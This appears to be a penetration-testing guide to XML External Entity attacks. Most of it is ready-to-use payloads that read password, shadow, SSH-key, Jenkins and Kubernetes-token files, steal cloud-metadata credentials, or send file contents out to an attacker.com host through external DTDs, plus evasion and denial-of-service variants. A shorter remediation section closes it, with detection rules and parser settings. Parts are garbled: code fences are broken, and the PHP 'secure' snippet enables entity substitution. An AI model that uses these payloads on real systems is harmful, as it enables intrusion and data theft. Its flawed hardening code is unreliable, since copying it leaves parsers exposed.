XXE vulnerabilities arise from XML's Document Type Definition (DTD) feature, which allows defining entities that can reference external resources. When a vulnerable XML parser processes these entities, it retrieves and includes the external resources, potentially exposing sensitive information.

In practice, full remote code execution rarely stems from XXE alone; it typically requires language-specific gadgets—such as PHP's `expect://` wrapper or Java deserialization sinks—which XXE merely helps reach.

```mermaid
sequenceDiagram
    actor A as Attacker
    participant C as Client
    participant S as Server
    participant X as XML Parser
    participant FS as File System

    A->>C: Craft malicious XML with XXE payload
    C->>S: Submit XML document
    S->>X: Pass XML for parsing
    X->>FS: Resolve external entity reference
    FS->>X: Return sensitive file content
    X->>S: Include file content in parsed result
    S->>C: Return response with sensitive data
    C->>A: Attacker views sensitive data
```

Types of XXE attacks include:

- **Classic XXE**: Direct extraction of data visible in responses
- **Blind XXE**: No direct output, but data can be exfiltrated through out-of-band techniques
- **Error-based XXE**: Leveraging error messages to extract data
- **XInclude-based XXE**: Using XInclude when direct DTD access is restricted

```mermaid
flowchart LR
    A[XXE Attack Types] --> B[Classic XXE]
    A --> C[Blind XXE]
    A --> D[Error-based XXE]
    A --> E[XInclude-based XXE]

    B -->|"Direct Output"| B1[Response contains file content]
    C -->|"Out-of-Band"| C1[Data exfiltration via callbacks]
    D -->|"Error Messages"| D1[Data in error output]
    E -->|"XInclude"| E1[Alternative to DTD]
```

#### Additional Discovery Methods

- Convert content type from "application/json"/"application/x-www-form-urlencoded" to "application/xml"
- Check file uploads that allow docx/xlsx/pdf/zip - unzip the package and add XML code into the XML files
- Test SVG file uploads for XML injection
- Check RSS feeds functionality for XML injection
- Fuzz for /soap API endpoints
- Test SSO integration points for XML injection in SAML requests/responses

#### Identify XML Injection Points

```mermaid
flowchart TD
    A[XML Injection Points] --> B[API Endpoints]
    A --> C[File Uploads]
    A --> D[Format Conversion]
    A --> E[Legacy Interfaces]
    A --> F[Hidden XML Parsers]
    A --> G[Content-Type Conversion]

    B --> B1[REST APIs]
    B --> B2[GraphQL]

    C --> C1[XML Files]
    C --> C2[DOCX/XLSX]
    C --> C3[SVG Images]
    C --> C4[PDF Files]

    D --> D1[JSON to XML]
    D --> D2[CSV to XML]

    E --> E1[SOAP]
    E --> E2[XML-RPC]
    E --> E3[SAML]

    F --> F1[Hidden Parameters]
    F --> F2[Legacy Code]

    G --> G1[JSON endpoints accepting XML]
```

- **API Endpoints**: Look for endpoints accepting XML data
- **File Uploads**: Features accepting XML-based files (DOCX, SVG, XML, etc.)
- **Format Conversion**: Services converting to/from XML formats
- **Legacy Interfaces**: SOAP web services, XML-RPC
- **Hidden XML Parsers**: Look for parameters that might be processed as XML behind the scenes
- **Content Type Conversion**: Endpoints that accept JSON but may process XML with proper Content-Type

#### Test Basic XXE Patterns

For each potential injection point, test with simple payloads:

- **Classic XXE (file retrieval)**:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <root>&xxe;</root>
  ```

  or

  ```xml
  <!DOCTYPE ase [ <!ENTITY %test SYSTEM "http://sib.com/sib"> %test; ]>
  <example>&test;</example>
  ```

- **Blind XXE (out-of-band detection)**:

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE test [
    <!ENTITY % xxe SYSTEM "http://attacker-server.com/malicious.dtd">
    %xxe;
  ]>
  <root>test</root>
  ```

- **XInclude attack** (when unable to define a DTD):
  ```xml
  <root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </root>
  ```

#### Billion Laughs Attack Steps

1. Capture the request in your proxy tool
2. Send it to repeater and convert body to XML format
3. Check the Accept header and modify to Application/xml if needed
4. Convert JSON to XML if no direct XML input is possible
5. Insert the billion laughs payload between XML tags
6. Adjust entity references (lol1 to lol9) to control DoS intensity

#### Check Alternative XML Formats

- **SVG files**:

  ```xml
  <?xml version="1.0" standalone="yes"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname" >
  ]>
  <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="16" x="0" y="16">&xxe;</text>
  </svg>
  ```

  or

  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
    <!ENTITY test SYSTEM "file:///etc/shadow">
  ]>
  <svg width="500" height="500">
    <circle cx="50" cy="50" r="40" fill="blue" />
    <text font-size="16" x="0" y="16">&test;</text>
  </svg>
  ```

- **DOCX/XLSX files**: Modify internal XML files (e.g., word/document.xml)
- **SOAP messages**: Test XXE in SOAP envelope

#### SAML 2.0 XXE Testing

SAML assertions are prime XXE targets. Test both requests and responses:

**AuthnRequest XXE:**

```xml
<samlp:AuthnRequest
  xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
  ID="_xxe" Version="2.0" IssueInstant="2025-01-01T00:00:00Z">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

**Response Assertion XXE:**

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/exfil">]>
  <saml:Assertion>
    <saml:AttributeValue>&xxe;</saml:AttributeValue>
  </saml:Assertion>
</samlp:Response>
```

**Encrypted Assertion XXE (Response Wrapping):**

```xml
<!-- Inject XXE before encryption, Service Provider decrypts and processes -->
<saml:EncryptedAssertion>
  <!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>
  <EncryptedData>...</EncryptedData>
</saml:EncryptedAssertion>
```

#### E-book Format Exploitation (EPUB)

EPUB files are ZIP archives containing XML. Target library management systems and e-reader apps:

```xml
<!-- content.opf inside EPUB -->
<?xml version="1.0"?>
<!DOCTYPE package [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata>
    <dc:title>&xxe;</dc:title>
  </metadata>
</package>
```

**Attack workflow:**

1. Create legitimate EPUB file
2. Extract contents (it's a ZIP)
3. Inject XXE into `META-INF/container.xml` or `content.opf`
4. Re-zip and upload to target (library systems, e-commerce platforms)

#### Apple Universal Links XXE

iOS deep linking configuration files:

```xml
<!-- apple-app-site-association generated from XML -->
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///var/mobile/Containers/Data/Application/config.plist">
]>
<config>
  <applinks>&xxe;</applinks>
</config>
```

#### Parameter Entity Testing

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<data>test</data>
```

#### Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<data>test</data>
```

#### XXE via Content-Type Manipulation

Try changing Content-Type header from:

```
Content-Type: application/json
```

to:

```
Content-Type: application/xml
```

or:

```
Content-Type: text/xml
```

# Vulnerable admission webhook
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  annotations:
    # Webhook receives and parses this XML
    config: |
      <?xml version="1.0"?>
      <!DOCTYPE root [
        <!ENTITY xxe SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
      ]>
      <config>&xxe;</config>
```

**Exploitation flow:**

```bash

# 4. Use token for privilege escalation
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat token)"
```

**ConfigMap XXE:**

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: xxe-config
data:
  config.xml: |
    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/kubernetes/manifests/kube-apiserver.yaml">]>
    <config>&xxe;</config>
```

#### CI/CD Pipeline XXE

**Jenkins XML Config Parsing:**

```xml
<!-- config.xml for Jenkins job -->
<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "file:///var/jenkins_home/secrets/master.key">
]>
<project>
  <description>&xxe;</description>
</project>
```

**GitLab CI Artifact Processing:**

```yaml

# .gitlab-ci.yml
test:
  script:
    - echo '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/gitlab-runner/config.toml">]><root>&xxe;</root>' > report.xml
  artifacts:
    reports:
      junit: report.xml # Parsed by GitLab
```

**GitHub Actions Workflow:**

```yaml

# Vulnerable action that processes XML artifacts
- name: Parse XML Report
  uses: vulnerable/xml-parser@v1
  with:
    xml-file: |
      <?xml version="1.0"?>
      <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/runner/.ssh/id_rsa">]>
      <testsuites>&xxe;</testsuites>
```

**Maven/Gradle Dependency Confusion:**

```xml
<!-- malicious pom.xml in supply chain -->
<?xml version="1.0"?>
<!DOCTYPE project [
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=">
]>
<project>
  <modelVersion>4.0.0</modelVersion>
  <name>&xxe;</name>
</project>
```

### Parser Misconfigurations

- **DTD Processing Enabled**: XML parsers with DTD processing enabled
- **External Entity Resolution**: Parsers allowing external entity references
- **XInclude Support**: Enabled processing of XInclude statements
- **Missing Entity Validation**: No validation of entity expansion

### File Disclosure via XXE

- **Local File Access**: Reading sensitive system files
  - `/etc/passwd` (Unix user information)
  - `/etc/shadow` (password hashes on Linux)
  - `C:\Windows\system32\drivers\etc\hosts` (Windows hosts file)
  - Application configuration files
  - Source code files
  - Database credentials

### SSRF via XXE

```mermaid
sequenceDiagram
    actor A as Attacker
    participant S as Vulnerable Server
    participant I as Internal Service
    participant C as Cloud Metadata

    A->>S: Submit XXE payload targeting internal service
    S->>I: Make request to internal service
    I->>S: Return internal service response
    S->>A: Return parsed result with internal data

    A->>S: Submit XXE payload targeting cloud metadata
    S->>C: Request cloud metadata (169.254.169.254)
    C->>S: Return sensitive cloud information
    S->>A: Return parsed result with cloud data
```

- **Internal Network Access**: Scanning internal systems
- **Cloud Metadata Access**: Accessing metadata services

  **AWS IMDSv2** (Token-based, harder via XXE):

  ```xml
  <!-- IMDSv1 still works in legacy environments -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name">]>

  <!-- IMDSv2 requires PUT request for token first -->
  <!-- Most XML parsers can't make PUT requests, limiting XXE exploitation -->
  ```

  **Azure Instance Metadata**:

  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>
  <!-- Requires Metadata: true header, may fail in XXE -->
  ```

  **GCP Metadata v2 (2024+)**:

  ```xml
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
  <!-- Now requires Metadata-Flavor: Google header -->
  <!-- Classic XXE can't set custom headers, use SSRF chain -->
  ```

  **Workarounds for header-protected metadata:**

  ```xml
  <!-- Use jar:// protocol (Java) to bypass some restrictions -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://metadata.google.internal!/computeMetadata/v1/instance/hostname">]>

  <!-- Or chain with open redirect on same domain -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://vulnerable-app.com/redirect?url=http://169.254.169.254/latest/meta-data/">]>
  ```

### Denial of Service

- **Billion Laughs Attack**: Exponential entity expansion

  ```xml
  <!DOCTYPE data [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  ]>
  <data>&lol3;</data>
  ```

- **Quadratic Blowup Attack**: Large string repeating

  ```xml
  <!DOCTYPE data [
    <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  ]>
  <data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>
  ```

- **External Resource DoS**: Loading large or never-ending external resources

### Filter Evasion Techniques

- **Case Variation**:

  ```xml
  <!docTypE test [ <!ENTity xxe SYSTEM "file:///etc/passwd"> ]>
  ```

- **Alternative Protocol Schemes**:

  ```
  file:///
  php://filter/convert.base64-encode/resource=
  gopher://
  jar://
  netdoc://
  ```

- **URL Encoding**:
  ```xml
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:%2F%2F%2Fetc%2Fpasswd"> ]>
  ```

### XXE in CDATA Sections

```xml
<![CDATA[<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;
]>]]>
```

### XXE via XML Namespace

```xml
<ns1:root xmlns:ns1="http://example.com">
  <ns1:data xmlns:ns1="http://example.com" xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
  </ns1:data>
</ns1:root>
```

### PHP Wrapper inside XXE

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```

#### XXE Detection and Exploitation Tools

- **OWASP ZAP**: XML External Entity scanner
- **Burp Suite Pro**: XXE scanner extension
- **XXEinjector**: Automated XXE testing tool
- **XXE-FTP**: Out-of-band XXE exploitation framework
- **dtd.gen**: DTD generator for XXE exfiltration
- **oxml_sec**: Tool for testing XXE in OOXML files (docx, xlsx, pptx)
- **Burp Suite Pro 2025.2+ (“Burp AI”)**: automatically chains scanner-found XXE with out-of-band callbacks for quicker triage.
- **Semgrep rules (java-xxe, python-xxe)**: static analysis that flags un-hardened XML parser usage.

#### Setup Tools for Out-of-Band Testing

- **Interactsh**: Interaction collection server
- **Burp Collaborator**: For out-of-band data detection
- **XSS Hunter**: Can be repurposed for XXE callbacks
- **SimpleHTTPServer**: Quick Python HTTP server setup

### Testing Methodologies

```mermaid
flowchart TD
    A[XXE Testing Methodology] --> B[Identify XML Processing Points]
    B --> C[Setup Out-of-Band Detection]
    C --> D[Test Basic XXE Payloads]
    D --> E[Analyze Results]
    E --> F[Exploit Vulnerability]
    F --> G[Expand Attack]

    B --> B1[API Endpoints]
    B --> B2[File Uploads]
    B --> B3[SOAP/Legacy Interfaces]

    C --> C1[Burp Collaborator]
    C --> C2[Custom HTTP Server]
    C --> C3[Interactsh]

    D --> D1[Classic XXE]
    D --> D2[Blind XXE]
    D --> D3[Error-based XXE]
    D --> D4[XInclude Attack]

    E --> E1[Direct Data Exposure]
    E --> E2[HTTP Callbacks]
    E --> E3[Error Messages]

    F --> F1[Local File Reading]
    F --> F2[SSRF]
    F --> F3[Advanced Exfiltration]

    G --> G1[Sensitive Data]
    G --> G2[Internal Network]
    G --> G3[RCE Attempt]
```

#### Basic Testing Process

1. **Identify XML Processing**: Locate endpoints accepting XML input
2. **Setup Monitoring**: Prepare out-of-band detection for blind XXE
3. **Injection Testing**: Test with basic XXE payloads
4. **Result Analysis**: Check for direct data exposure or callbacks
5. **Vulnerability Confirmation**: Attempt to read a harmless file like `/etc/hostname`

#### Advanced Exploitation Techniques

##### Data Exfiltration (for Blind XXE)

```mermaid
sequenceDiagram
    actor A as Attacker
    participant AS as Attacker Server (DTD)
    participant VS as Vulnerable Server
    participant FS as File System

    A->>AS: Host malicious DTD file
    A->>VS: Submit XML with reference to external DTD
    VS->>AS: Request malicious DTD
    AS->>VS: Deliver DTD with file reading & exfiltration
    VS->>FS: Read sensitive file
    Note over VS: Process DTD instructions
    VS->>AS: Make callback with file content in URL
    AS->>A: Log request with exfiltrated data
```

1. Host a malicious DTD file on your server:

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfil;
   ```

2. Use an XXE payload that references your DTD:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE data [
     <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
     %dtd;
   ]>
   <data>test</data>
   ```

##### XXE OOB with DTD and PHP filter

Payload:

```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://your-attacker-server.com/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

External DTD (`http://your-attacker-server.com/dtd.xml`):

```dtd
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://your-attacker-server.com/log.php?data=%data;'>">
```

##### Error-Based Exfiltration

1. Host a malicious DTD with error-based exfiltration:
   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
   ```

##### XXE for SSRF

Use XXE to trigger internal requests:

```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal-service:8080/admin"> ]>
```

##### XXE Inside SOAP

```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```

##### XXE PoC Examples

```xml
<!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [ <!ENTITY xxe_test SYSTEM "file:///etc/passwd"> ]><x>&xxe_test;</x>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe_test [<!ELEMENT foo ANY><!ENTITY xxe_test SYSTEM "file:///etc/passwd">]><foo>&xxe_test;</foo>
```

##### XXE via File Upload (SVG Example)

Create an SVG file with the payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

Upload it where SVG is allowed (e.g., profile picture, comment attachment).

#### Comprehensive XXE Testing Checklist

1. **Basic entity testing**:
   - Test file access via `file://` protocol
   - Test network access via `http://` protocol

2. **Content delivery**:
   - Direct XXE with immediate results
   - Out-of-band XXE with remote DTD
   - Error-based XXE for data extraction

3. **Protocol testing**:
   - Test various protocols (file, http, https, ftp, etc.)
   - Attempt restricted protocol access

4. **Format variations**:
   - Test XXE in SVG uploads
   - Test XXE in document formats (DOCX, XLSX, PDF)
   - Test SOAP/XML-RPC interfaces

5. **Bypasses**:
   - Try character encoding tricks
   - Use nested entities
   - Apply URL encoding
   - Test with namespace manipulations

## Remediation Recommendations

- Disable DTD processing completely if possible
- Disable external entity resolution
- Implement proper input validation
- Use safe XML parsers that disable XXE by default
- Apply patch management to XML parsers
- Use newer API formats like JSON where feasible
- **Network egress allow-list**: Restrict outbound traffic from XML-parsing hosts to block blind-XXE callbacks.
- **API Gateway XML Protection**: Implement XML threat protection at the gateway layer

# API Gateway Request Validator
RequestValidator:
  Type: AWS::ApiGateway::RequestValidator
  Properties:
    ValidateRequestBody: true
    ValidateRequestParameters: true

# Lambda authorizer to inspect XML
def lambda_handler(event, context):
    body = event.get('body', '')

    # Block DTD declarations
    if '<!DOCTYPE' in body or '<!ENTITY' in body:
        return {
            'statusCode': 400,
            'body': 'XML DTD not allowed'
        }

    # Size limit
    if len(body) > 100000:  # 100KB
        return {
            'statusCode': 413,
            'body': 'Request too large'
        }
```

#### Kong Gateway

```yaml
plugins:
  - name: xml-threat-protection
    config:
      source_size_limit: 1000000 # 1MB max
      name_size_limit: 255 # Max element name length
      child_count_limit: 100 # Max child elements
      attribute_count_limit: 50 # Max attributes per element
      entity_expansion_limit: 0 # Disable entity expansion
      external_entity_limit: 0 # Disable external entities
      dtd_processing: false # Disable DTD
```

#### Apigee Edge

```xml
<!-- XMLThreatProtection policy -->
<XMLThreatProtection name="XML-Threat-Protection">
  <Source>request</Source>
  <StructureLimits>
    <NodeDepth>10</NodeDepth>
    <AttributeCountPerElement>5</AttributeCountPerElement>
    <NamespaceCountPerElement>3</NamespaceCountPerElement>
    <ChildCount includeComment="true" includeElement="true" includeProcessingInstruction="true" includeText="true">10</ChildCount>
  </StructureLimits>
  <ValueLimits>
    <Text>1000</Text>
    <Attribute>100</Attribute>
    <NamespaceURI>100</NamespaceURI>
    <Comment>500</Comment>
    <ProcessingInstructionData>500</ProcessingInstructionData>
  </ValueLimits>
</XMLThreatProtection>
```

# ModSecurity rules for XXE
SecRule REQUEST_BODY "@rx <!ENTITY" \
    "id:1000,phase:2,deny,status:403,msg:'XXE Attack Detected'"

SecRule REQUEST_BODY "@rx <!DOCTYPE.*\[" \
    "id:1001,phase:2,deny,status:403,msg:'DTD Declaration Blocked'"
```

### Parser default hardening (2024-2025)

- **libxml2 ≥ 2.13**: `XML_PARSE_NO_XXE` disables all external entity resolution by default.
- **Python ≥ 3.13**: standard `xml.*` modules forbid external entities; enable only via `feature_external_ges`.
- **.NET 8**: project templates set `XmlReaderSettings.DtdProcessing = Prohibit`.
- **Java 22**: `XMLConstants.FEATURE_SECURE_PROCESSING` is enabled and `external-general-entities` is `false`.

### Cloud-metadata nuance

AWS IMDSv2 now requires a session token. To exploit metadata via XXE you must first obtain a token with  
`PUT /latest/api/token` and then pass it in the `X-aws-ec2-metadata-token` header of subsequent requests.

### Secure Parser Configuration (practical snippets)

```java
// Java (SAX/StAX/DOM)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

```python

# Python – prefer defusedxml
from defusedxml.ElementTree import fromstring
fromstring(xml_data)
```

```csharp
// .NET
var settings = new XmlReaderSettings
{
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
using var reader = XmlReader.Create(stream, settings);
```

```go
// Go – standard encoding/xml does not resolve external entities
// but avoid streaming untrusted data into custom resolvers
type Safe struct{ }
```

```php
// PHP – libxml
$old = libxml_disable_entity_loader(true);
$xml = simplexml_load_string($data, "SimpleXMLElement", LIBXML_NONET | LIBXML_NOENT);
libxml_disable_entity_loader($old);
```
